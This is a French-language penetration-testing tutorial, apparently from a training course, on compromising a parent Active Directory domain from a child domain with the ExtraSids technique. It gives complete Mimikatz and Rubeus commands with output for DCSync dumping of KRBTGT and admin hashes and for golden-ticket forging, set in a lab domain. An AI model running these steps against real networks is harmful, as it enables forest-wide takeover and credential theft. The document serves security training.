Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows
==============================================================================================

* * * * *

Introduction à l'histoire du SID
--------------------------------

L' attribut [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) est utilisé dans les scénarios de migration. Si un utilisateur d'un domaine est migré vers un autre domaine, un nouveau compte est créé dans le deuxième domaine. Le SID de l'utilisateur d'origine sera ajouté à l'attribut d'historique SID du nouvel utilisateur, garantissant ainsi que l'utilisateur peut toujours accéder aux ressources du domaine d'origine.

L'historique SID est destiné à fonctionner sur plusieurs domaines, mais peut fonctionner dans le même domaine. À l'aide de Mimikatz, un attaquant peut effectuer une injection d'historique SID et ajouter un compte administrateur à l'attribut Historique SID d'un compte qu'il contrôle. Lors de la connexion avec ce compte, tous les SID associés au compte sont ajoutés au token de l'utilisateur.

Ce jeton est utilisé pour déterminer à quelles ressources le compte peut accéder. Si le SID d'un compte d'administrateur de domaine est ajouté à l'attribut Historique SID de ce compte, alors ce compte pourra effectuer DCSync et créer un [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) ou un ticket d'octroi de tickets Kerberos (TGT), ce qui nous permettra de authentifier comme n'importe quel compte dans le domaine de notre choix pour une persistance ultérieure.

* * * * *

Attaque ExtraSids - Mimikatz
----------------------------

Cette attaque permet de compromettre un domaine parent une fois que le domaine enfant a été compromis. Au sein de la même forêt AD, la propriété [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) est respectée en raison d'un manque de protection [par filtrage SID](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) . Le filtrage SID est une protection mise en place pour filtrer les demandes d'authentification d'un domaine dans une autre forêt au sein d'une approbation. Par conséquent, si un utilisateur d'un domaine enfant dont le sidHistory est défini sur `Enterprise Admins group`(qui n'existe que dans le domaine parent), il est traité comme un membre de ce groupe, ce qui permet un accès administratif à l'ensemble de la forêt. En d'autres termes, nous créons un Golden Ticket à partir du domaine enfant compromis pour compromettre le domaine parent. Dans ce cas, nous tirerons parti de `SIDHistory`pour accorder à un compte (ou à un compte inexistant) des droits d'administrateur d'entreprise en modifiant cet attribut pour contenir le SID du groupe Administrateurs d'entreprise, ce qui nous donnera un accès complet au domaine parent sans en faire réellement partie. du groupe.

Pour effectuer cette attaque après avoir compromis un domaine enfant, nous avons besoin des éléments suivants :

-   Le hachage KRBTGT pour le domaine enfant
-   Le SID du domaine enfant
-   Le nom d'un utilisateur cible dans le domaine enfant (n'a pas besoin d'exister !)
-   Le nom de domaine complet du domaine enfant.
-   Le SID du groupe Enterprise Admins du domaine racine.
-   Avec ces données collectées, l'attaque peut être réalisée avec Mimikatz.

Nous pouvons désormais rassembler chaque élément de données requis pour effectuer l'attaque ExtraSids. Tout d'abord, nous devons obtenir le hachage NT pour le compte [KRBTGT](https://adsecurity.org/?p=483) , qui est un compte de service pour le centre de distribution de clés (KDC) dans Active Directory. Le compte KRB (Kerberos) TGT (Ticket Granting Ticket) permet de crypter/signer tous les tickets Kerberos accordés au sein d'un domaine donné. Les contrôleurs de domaine utilisent le mot de passe du compte pour déchiffrer et valider les tickets Kerberos. Le compte KRBTGT peut être utilisé pour créer des tickets Kerberos TGT pouvant être utilisés pour demander des tickets TGS pour n'importe quel service sur n'importe quel hôte du domaine. Ceci est également connu sous le nom d'attaque Golden Ticket et constitue un mécanisme de persistance bien connu des attaquants dans les environnements Active Directory. La seule façon d'invalider un Golden Ticket est de changer le mot de passe du compte KRBTGT, ce qui doit être fait périodiquement et définitivement après un test d'intrusion où une compromission totale du domaine est atteinte.

Puisque nous avons compromis le domaine enfant, nous pouvons nous connecter en tant qu'administrateur de domaine ou similaire et effectuer l'attaque DCSync pour obtenir le hachage NT du compte KRBTGT.

#### Obtention du hachage NT du compte KRBTGT à l'aide de Mimikatz

  Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows

```
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e

```

Nous pouvons utiliser la `Get-DomainSID`fonction PowerView pour obtenir le SID du domaine enfant, mais cela est également visible dans la sortie Mimikatz ci-dessus.

#### Utilisation de Get-DomainSID

  Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows

```
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689

```

Ensuite, nous pouvons utiliser `Get-DomainGroup`PowerView pour obtenir le SID du groupe Enterprise Admins dans le domaine parent. Nous pourrions également le faire avec la cmdlet [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) avec une commande telle que `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.

#### Obtention du SID du groupe d'administrateurs d'entreprise à l'aide de Get-DomainGroup

  Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows

```
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519

```

À ce stade, nous avons rassemblé les points de données suivants :

-   Le hachage KRBTGT pour le domaine enfant :`9d765b482771505cbe97411065964d5f`
-   Le SID du domaine enfant :`S-1-5-21-2806153819-209893948-922872689`
-   Le nom d'un utilisateur cible dans le domaine enfant (n'a pas besoin d'exister pour créer notre Golden Ticket !) : Nous choisirons un faux utilisateur :`hacker`
-   Le FQDN du domaine enfant :`LOGISTICS.INLANEFREIGHT.LOCAL`
-   Le SID du groupe Enterprise Admins du domaine racine :`S-1-5-21-3842939050-3880317879-2865463114-519`

Avant l'attaque, nous pouvons confirmer qu'il n'y a aucun accès au système de fichiers du DC dans le domaine parent.

#### Utiliser ls pour confirmer l'absence d'accès

  Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows

```
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

```

En utilisant Mimikatz et les données répertoriées ci-dessus, nous pouvons créer un Golden Ticket pour accéder à toutes les ressources du domaine parent.

#### Créer un Golden Ticket avec Mimikatz

  Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows

```
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session

```

Nous pouvons confirmer que le ticket Kerberos de l'utilisateur pirate inexistant réside en mémoire.

#### Confirmer qu'un ticket Kerberos est en mémoire à l'aide de klist

  Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows

```
PS C:\htb> klist

Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)
        Renew Time: 3/25/2032 19:59:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

```

À partir de là, il est possible d'accéder à toutes les ressources du domaine parent, et nous pourrions compromettre le domaine parent de plusieurs manières.

#### Liste de l'intégralité du lecteur C: du contrôleur de domaine

  Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows

```
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
 Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\academy-ea-dc01.inlanefreight.local\c$

09/15/2018  12:19 AM    <DIR>          PerfLogs
10/06/2021  01:50 PM    <DIR>          Program Files
09/15/2018  02:06 AM    <DIR>          Program Files (x86)
11/19/2021  12:17 PM    <DIR>          Shares
10/06/2021  10:31 AM    <DIR>          Users
03/21/2022  12:18 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  18,080,178,176 bytes free

```

* * * * *

Attaque ExtraSids - Rubeus
--------------------------

Nous pouvons également effectuer cette attaque en utilisant Rubeus. Tout d'abord, encore une fois, nous confirmerons que nous ne pouvons pas accéder au système de fichiers du contrôleur de domaine du domaine parent.

#### Utiliser ls pour confirmer l'absence d'accès avant d'exécuter Rubeus

  Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows

```
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAcces
   sException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

<SNIP>

```

Ensuite, nous formulerons notre commande Rubeus en utilisant les données que nous avons récupérées ci-dessus. L' `/rc4`indicateur est le hachage NT du compte KRBTGT. Le `/sids`drapeau indiquera à Rubeus de créer notre Golden Ticket nous donnant les mêmes droits que les membres du groupe Enterprise Admins dans le domaine parent.

#### Créer un Golden Ticket avec Rubeus

  Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows

```
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 9D765B482771505CBE97411065964D5F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'

[*] AuthTime       : 3/29/2022 10:06:41 AM
[*] StartTime      : 3/29/2022 10:06:41 AM
[*] EndTime        : 3/29/2022 8:06:41 PM
[*] RenewTill      : 4/5/2022 10:06:41 AM

[*] base64(ticket.kirbi):
      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG
      UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M
      T0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhH
      T3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++2iX94uRrwa/S
      VfgHhAuxKPlIi2phwjkxYETluKl26AUo2+WwxDXmXwGJ6LLWN1W4YGScgXAX+Kgs9xrAqJMabsAQqDfy
      k7+0EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDWjUN4mxsqINm7qNQcZHWN8kFSfAbqyD/OZIMc
      g78hZ8IYL+Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx/i3PfWqP+dNREtldE2sgIUQm
      9f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp/vmPBlqQGxAtRKzgzY
      acuk8YYogiP6815+x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd/EFM7S3NdMnJOz
      X3P7ObzVTAPQ/o9lSaXlopQH6L46z6PTcC/4GwaRbqVnm1RU0O3VpVr5bgaR+Nas5VYGBYIHOw3Qx5YT
      3dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz+H
      WlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG+eghE+CN999gHNMG
      Be1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo
      /RIfLx12GlLzN5y7132Rj4iZlkVgAyB6+PIpjuDLDSq6UJnHRkYlJ/3l5j0KxgjdZbwoFbC7p76IPC3B
      aY97mXatvMfrrc/Aw5JaIFSaOYQ8M/frCG738e90IK/2eTFZD9/kKXDgmwMowBEmT3IWj9lgOixNcNV/
      OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW/pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3
      sERVQ5VSc7u4oaAIyv7Acq+UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIH
      eOhKwWOY6GVpVWEShRLDl9/XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA+2+xps6WS/NNf1vZtUV/KRLlW
      sL5v91jmzGiZQcENkLeozZ7kIsY/zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e+cXZ+NXLKxex37HQ
      F5aNP7EITdjQds0lbyb9K/iUY27iyw7dRVLz3y5Dic4S4+cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJij
      Hf+jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2T
      JTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZo
      YWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIy
      MDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxP
      Q0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==

[+] Ticket successfully imported!

```

Encore une fois, on peut vérifier que le ticket est en mémoire grâce à la `klist`commande.

#### Confirmer que le ticket est en mémoire à l'aide de klist

  Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows

```
PS C:\htb> klist

Current LogonId is 0:0xf6495

Cached Tickets: (1)

#0>	Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
	Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
	Start Time: 3/29/2022 10:06:41 (local)
	End Time:   3/29/2022 20:06:41 (local)
	Renew Time: 4/5/2022 10:06:41 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY
	Kdc Called:

```

Enfin, nous pouvons tester cet accès en effectuant une attaque DCSync contre le domaine parent, ciblant l' `lab_adm`utilisateur administrateur du domaine.

#### Effectuer une attaque DCSync

  Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows

```
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0

```

Lorsqu'il s'agit de plusieurs domaines et que notre domaine cible n'est pas le même que le domaine de l'utilisateur, nous devrons spécifier le domaine exact pour effectuer l'opération DCSync sur le contrôleur de domaine particulier. La commande pour cela ressemblerait à ce qui suit :

  Attaquer les approbations de domaine - Enfant -> Affiliations parentales - à partir de Windows

```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0

```

* * * * *

Prochaines étapes
-----------------

Maintenant que nous avons parcouru la compromission du domaine enfant --> parent à partir d'une boîte d'attaque Windows, nous allons aborder quelques façons d'obtenir la même chose si nous sommes limités à un hôte d'attaque Linux.
